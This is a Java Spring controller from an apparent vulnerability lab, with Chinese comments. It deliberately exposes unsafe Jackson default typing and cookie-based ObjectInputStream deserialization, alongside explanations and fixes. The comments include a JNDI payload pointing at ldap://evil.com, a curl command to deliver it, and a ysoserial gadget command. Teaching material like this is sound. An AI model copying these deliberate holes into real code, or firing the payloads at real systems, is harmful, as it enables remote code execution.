package com.vulnlab.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

/**
 * Java 反序列化漏洞演示
 *
 * 漏洞说明：
 * - Jackson enableDefaultTyping() 允许反序列化任意类
 * - Cookie 反序列化使用 ObjectInputStream 读取不可信数据
 *
 * 修复方案：
 * - 禁用 enableDefaultTyping()
 * - 使用白名单验证反序列化的类
 * - 使用安全的序列化格式（如 JSON）
 *
 * @author VulnLab
 */
@RestController
@RequestMapping("/deserialize")
public class DeserializeController {

    private static final Logger logger = LoggerFactory.getLogger(DeserializeController.class);

    /**
     * Jackson 反序列化漏洞
     *
     * 漏洞原理：启用 enableDefaultTyping() 后，Jackson 可以反序列化任意类
     * 攻击向量：通过 JSON 中的 @type 指定恶意类进行 RCE
     *
     * 测试 Payload:
     * ["org.jsecurity.realm.jndi.JndiRealmFactory", {"jndiNames":"ldap://evil.com/exp"}]
     *
     * 命令示例:
     * curl -X POST http://localhost:8080/deserialize/jackson \
     *   -H "Content-Type: application/json" \
     *   -d '["org.jsecurity.realm.jndi.JndiRealmFactory", {"jndiNames":"ldap://evil.com/exp"}]'
     *
     * @param payload JSON payload
     * @return 反序列化结果
     */
    @PostMapping("/jackson")
    public String jackson(@RequestBody String payload) {
        ObjectMapper mapper = new ObjectMapper();
        // 漏洞代码：启用默认类型，允许反序列化任意类
        mapper.enableDefaultTyping();

        try {
            Object obj = mapper.readValue(payload, Object.class);
            logger.info("Jackson deserialize result: {}", obj);
            mapper.writeValueAsString(obj);
            return "Jackson deserialization completed. Object: " + obj.getClass().getName();
        } catch (IOException e) {
            logger.error("Jackson deserialization error", e);
            return "Jackson deserialization error: " + e.getMessage();
        }
    }

    /**
     * Cookie 反序列化漏洞
     *
     * 漏洞原理：直接从 Cookie 中读取序列化数据并反序列化
     * 攻击向量：使用 ysoserial 生成恶意 payload，通过 Cookie 发送
     *
     * 生成 Payload (使用 ysoserial):
     * java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64
     *
     * 命令示例:
     * curl http://localhost:8080/deserialize/rememberMe \
     *   -H "Cookie: rememberMe=<base64_payload>"
     *
     * @param request HTTP 请求
     * @return 反序列化结果
     */
    @GetMapping("/rememberMe")
    public String rememberMe(HttpServletRequest request) {
        // 获取 rememberMe Cookie
        Cookie[] cookies = request.getCookies();
        if (cookies == null) {
            return "No rememberMe cookie found.";
        }

        for (Cookie cookie : cookies) {
            if ("rememberMe".equals(cookie.getName())) {
                String rememberMe = cookie.getValue();
                logger.info("RememberMe cookie found, length: {}", rememberMe.length());

                try {
                    // 漏洞代码：直接反序列化 Cookie 中的数据
                    byte[] decoded = Base64.getDecoder().decode(rememberMe);
                    ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
                    ObjectInputStream in = new ObjectInputStream(bytes);
                    Object obj = in.readObject();
                    in.close();

                    logger.info("Deserialized object: {}", obj.getClass().getName());
                    return "Deserialization completed. Object: " + obj.getClass().getName();
                } catch (Exception e) {
                    logger.error("Deserialization error", e);
                    return "Deserialization error: " + e.getMessage();
                }
            }
        }

        return "No rememberMe cookie found.";
    }

    /**
     * Cookie 反序列化漏洞 - 专门用于测试的端点
     *
     * 这个端点与 java-sec-code 的路径保持一致
     *
     * @param request HTTP 请求
     * @return 反序列化结果
     */
    @GetMapping("/rememberMe/vuln")
    public String rememberMeVuln(HttpServletRequest request) {
        Cookie[] cookies = request.getCookies();
        if (cookies == null) {
            return "No rememberMe cookie. Right?";
        }

        for (Cookie cookie : cookies) {
            if ("rememberMe".equals(cookie.getName())) {
                String rememberMe = cookie.getValue();
                logger.info("RememberMe cookie: {}", rememberMe.substring(0, Math.min(20, rememberMe.length())));

                try {
                    byte[] decoded = Base64.getDecoder().decode(rememberMe);
                    ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
                    ObjectInputStream in = new ObjectInputStream(bytes);
                    in.readObject();
                    in.close();

                    return "Are u ok?";
                } catch (Exception e) {
                    logger.error("Deserialization error", e);
                    return "Deserialization error: " + e.getMessage();
                }
            }
        }

        return "No rememberMe cookie. Right?";
    }
}
